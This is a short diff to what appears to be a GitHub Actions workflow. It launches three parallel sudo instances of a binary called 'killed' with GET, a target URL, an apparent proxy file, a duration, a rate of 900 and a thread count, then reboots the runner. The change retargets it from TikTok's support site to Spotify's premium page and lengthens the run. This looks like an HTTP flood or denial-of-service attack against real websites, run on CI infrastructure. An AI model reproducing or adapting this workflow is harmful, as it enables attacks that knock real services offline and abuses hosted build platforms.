@@ -18,7 +18,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..3}; do
-            sudo timeout 20 ./killed GET https://support.tiktok.com/en fres.txt 20 900 6 &
+            sudo timeout 30 ./killed GET https://www.spotify.com/tr-tr/premium/ fres.txt 30 900 6 &
             PIDS+=($!)
           done
           
@@ -27,7 +27,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 20
+        run: sleep 30
         
       - name: OK !
         run: sudo reboot
